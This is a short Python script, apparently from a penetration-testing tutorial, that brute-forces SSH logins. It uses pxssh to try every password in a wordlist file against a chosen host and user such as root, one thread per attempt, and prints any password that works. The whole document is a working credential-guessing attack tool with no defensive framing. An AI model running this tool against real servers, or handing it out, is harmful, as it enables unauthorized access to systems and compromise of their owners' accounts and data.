#coding=utf-8
from pexpect import pxssh
import argparse
import threading

maxConnetions = 5
connect_lock = threading.BoundedSemaphore(value=maxConnetions)


def connect(host, user, password):
    try:
        s = pxssh.pxssh()
        # 登录ssh测试
        s.login(host, user, password)
        print("[+] Password Found: {}".format(password))
    except pxssh.ExceptionPxssh as e:
        pass

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('-H', dest='Host', help="like: 201.91.58.3")
    parser.add_argument('-F', dest='passwdFile', help="like: /root/pass.txt")
    parser.add_argument('-u', dest='user',help="like :root")
    args = parser.parse_args()
    host = args.Host
    passwdFile = args.passwdFile
    user = args.user

    with open(passwdFile, 'r') as f:
        for line in f.readlines():
            with connect_lock:
                password = line.strip('\n')
                print("[-] Testing: {}".format(password))
                # 起线程每个密码尝试登录一次
                t = threading.Thread(target=connect, args=(host, user, password))
                t.start()


if __name__ == '__main__':
    main()
